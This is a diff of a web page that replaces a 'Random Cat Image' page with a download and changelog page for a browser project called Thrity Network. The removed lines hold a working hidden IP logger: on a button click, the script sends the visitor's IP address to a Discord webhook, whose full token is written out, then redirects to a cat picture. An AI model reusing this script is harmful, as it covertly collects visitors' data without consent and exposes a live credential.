@@ -1,58 +1,239 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Random Cat Image</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-        }
-        button {
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
-            background-color: #4CAF50;
-            color: #fff;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #3e8e41;
-        }
-    </style>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>thrity.online — Download</title>
+<style>
+  :root {
+    --bg: #0f1115;
+    --panel: #171a21;
+    --border: #2a2e38;
+    --text: #e6e6e6;
+    --muted: #9aa0ac;
+    --accent: #4dd0e1;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0;
+    background: var(--bg);
+    color: var(--text);
+    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    display: flex;
+    justify-content: center;
+    padding: 60px 20px;
+  }
+  main {
+    width: 100%;
+    max-width: 560px;
+  }
+  h1 {
+    font-size: 2rem;
+    margin: 0 0 4px 0;
+    letter-spacing: -0.02em;
+  }
+  .tagline {
+    color: var(--muted);
+    margin: 0 0 32px 0;
+  }
+  .tags {
+    display: flex;
+    gap: 8px;
+    flex-wrap: wrap;
+    margin-bottom: 32px;
+  }
+  .tag {
+    border: 1px solid var(--accent);
+    color: var(--accent);
+    font-size: 0.8rem;
+    padding: 3px 10px;
+    border-radius: 999px;
+  }
+  .download-btn {
+    display: inline-block;
+    background: var(--accent);
+    color: #05171a;
+    font-weight: 600;
+    text-decoration: none;
+    padding: 12px 22px;
+    border-radius: 8px;
+    margin-bottom: 32px;
+  }
+  .download-btn:hover {
+    opacity: 0.9;
+  }
+  h2 {
+    font-size: 0.95rem;
+    text-transform: uppercase;
+    letter-spacing: 0.06em;
+    color: var(--muted);
+    margin: 32px 0 10px 0;
+  }
+  pre {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px;
+    overflow-x: auto;
+    font-size: 0.9rem;
+    line-height: 1.5;
+  }
+  /* ---- changelog ---- */
+  .changelog-entry {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 16px 18px;
+    margin-bottom: 12px;
+  }
+  .changelog-entry .row {
+    display: flex;
+    align-items: baseline;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .changelog-entry .version {
+    font-weight: 600;
+    color: var(--text);
+    font-size: 0.95rem;
+  }
+  .changelog-entry .version .latest {
+    font-size: 0.65rem;
+    text-transform: uppercase;
+    letter-spacing: 0.05em;
+    color: #05171a;
+    background: var(--accent);
+    padding: 2px 6px;
+    border-radius: 999px;
+    margin-left: 8px;
+    vertical-align: middle;
+  }
+  .changelog-entry a.dl {
+    font-size: 0.8rem;
+    white-space: nowrap;
+  }
+  .changelog-entry ul {
+    margin: 0;
+    padding-left: 18px;
+    color: var(--muted);
+    font-size: 0.85rem;
+    line-height: 1.6;
+  }
+  footer {
+    margin-top: 40px;
+    font-size: 0.85rem;
+    color: var(--muted);
+  }
+  footer a { color: var(--muted); }
+  a { color: var(--accent); }
+</style>
 </head>
 <body>
-    <h1>Random Cat Image</h1>
-    <button id="random-cat-button">Get Random Cat Image</button>
+<main>
+  <h1>Thrity Network</h1>
+  <p class="tagline">A free, lightweight browser and network.</p>
+  <div class="tags">
+    <span class="tag">no ads</span>
+    <span class="tag">no tracking</span>
+    <span class="tag">no accounts</span>
+    <span class="tag">open source</span>
+  </div>
+  <a class="download-btn" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.05.tar.gz">
+    Download thrity-network0.05.tar.gz
+  </a>
+  <h2>Install</h2>
+  <pre>tar -xzf thrity-network0.05.tar.gz
+cd thrity-network
+bash setup.sh
+python3 browser/30web.py</pre>
 
-    <script>
-        const button = document.getElementById('random-cat-button');
-        button.addEventListener('click', async () => {
-            // Send IP address to Discord webhook
-            const ipAddress = await getIpAddress();
-            const webhookUrl = 'https://discordapp.com/api/webhooks/1531144499546558595/172iEU789ufiRQ7JQkPtJ4xpTJkvj5LiIqSMidebz-QVuXK_ciyW_2GlJ6xPDukLNY94';
-            const response = await fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    content: `IP Address: ${ipAddress}`
-                })
-            });
+  <h2>Changelog</h2>
 
-            // Redirect to random cat image
-            const randomCatUrl = 'https://source.unsplash.com/800x600/?cat';
-            window.location.href = randomCatUrl;
-        });
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.05 <span class="latest">latest</span></span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.05.tar.gz">download</a>
+    </div>
+    <ul>
+      <li>New: full developer platform — WebKit's built-in Web Inspector is back on (element/CSS/JS console/network/storage), plus a Thrity DevTools window with resolver debugging, page timing, a security panel, and an extensions panel</li>
+      <li>New: a complete extension system with a small sandboxed DSL (no Python execution, no filesystem/network access beyond what's explicitly permitted) — toolbar buttons, menus, panels, page scripts, and 6 browser events extensions can react to</li>
+      <li>New: permission system (ui, devtools, page_info, page_scripts, network, storage) — network access is restricted to the Thrity network only, storage is private and capped per extension, page scripts only load from the extension's own folder</li>
+      <li>New: 3 example extensions included and auto-installed by setup.sh — Developer Helper, Page Tools, Network Monitor — plus a headless CLI (`extensions/cli.py`) to validate and test extensions without launching the browser</li>
+      <li>Fixed: many .onion sites failing with "Internal SOCKSv5 proxy server error" — bare onion addresses now default to plain HTTP instead of forced HTTPS, self-signed onion certs are trusted the same way .thrity certs are, and failed loads on Tor-anonymized tabs now retry automatically since fresh-circuit failures are usually transient</li>
+      <li>Servers: host server gets a `/thrity-info` debug endpoint (uptime, requests served); registry server gets a `/status` endpoint (version, uptime, site/request counts); both support `--verbose` for full per-request timing logs</li>
+      <li>Resolver: new debug-trace mode (`--debug`) showing exactly which step (cache/hosts.json/which registry) answered a lookup and how long each took, same data DevTools' Resolver panel uses</li>
+    </ul>
+  </div>
 
-        // Function to get IP address
-        async function getIpAddress() {
-            const response = await fetch('https://api.ipify.org');
-            const ipAddress = await response.text();
-            return ipAddress;
-        }
-    </script>
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.04</span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.04.tar.gz">download</a>
+    </div>
+    <ul>
+      <li>Faster: registries are now queried in parallel instead of one-by-one, and resolved names are cached briefly, so page loads and clicking around a site are noticeably snappier</li>
+      <li>Faster: host server now gzip-compresses pages/CSS/JS on the wire and lets browsers cache static assets for a session</li>
+      <li>Fixes many sites that "didn't work": local storage and video playback (MediaSource) are back on, still wiped when a tab closes, plus a more standard browser identity so fewer sites wrongly block 30web as unsupported</li>
+      <li>A failed .thrity page load now automatically re-resolves and retries once instead of leaving you stuck if a site recently moved</li>
+      <li>Camera/mic/location access is now asked per-site with a prompt instead of silently blocked outright</li>
+      <li>More secure: registry server can run with --https to stop registration secrets from being sent in plain text</li>
+      <li>More secure: stricter validation on .thrity names everywhere (resolver, host server, registry), file writes to the registry are now atomic and race-safe, and lookups are rate-limited too, not just registrations</li>
+    </ul>
+  </div>
+
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.03</span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.03.tar.gz">download</a>
+    </div>
+    <ul>
+      <li>Anonymize (Tor) is now per-tab, not browser-wide</li>
+      <li>Every tab fully isolated - separate cookies/login state per tab, not just no shared history</li>
+      <li>.thrity sites can now link to each other with thrity://name links, not just be typed in the address bar</li>
+      <li>New "Directory" button browses every site a registry knows about</li>
+      <li>Host server no longer exposes raw folder listings when a page is missing</li>
+      <li>Registry server now rate-limits registrations to slow down name-squatting scripts</li>
+    </ul>
+  </div>
+
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.02</span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.02.tar.gz">download</a>
+    </div>
+    <ul>
+      <li>Tabs, no saved history — every tab is wiped on close</li>
+      <li>Optional HTTPS for .thrity sites (self-signed, auto-trusted)</li>
+      <li>"Anonymize" toggle routes traffic through Tor</li>
+      <li>Hardened WebKit settings (mic/camera blocked, no DNS prefetch, no local storage)</li>
+      <li>Fixed widespread TLS handshake errors on clearnet sites</li>
+    </ul>
+  </div>
+
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.01</span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network0.01.zip">download</a>
+    </div>
+    <ul>
+      <li>Address bar now shows the .thrity name instead of the real IP:port</li>
+    </ul>
+  </div>
+
+  <div class="changelog-entry">
+    <div class="row">
+      <span class="version">v0.00 — first release</span>
+      <a class="dl" href="https://github.com/thford64-boop/thrity/releases/download/thrity/thrity-network.tar.gz">download</a>
+    </div>
+    <ul>
+      <li>30web browser (WebKit2GTK), .thrity resolver, host server, registry server</li>
+    </ul>
+  </div>
+
+  <footer>
+    <a href="https://github.com/thford64-boop/thrity">Source code on GitHub</a>
+  </footer>
+</main>
 </body>
 </html>
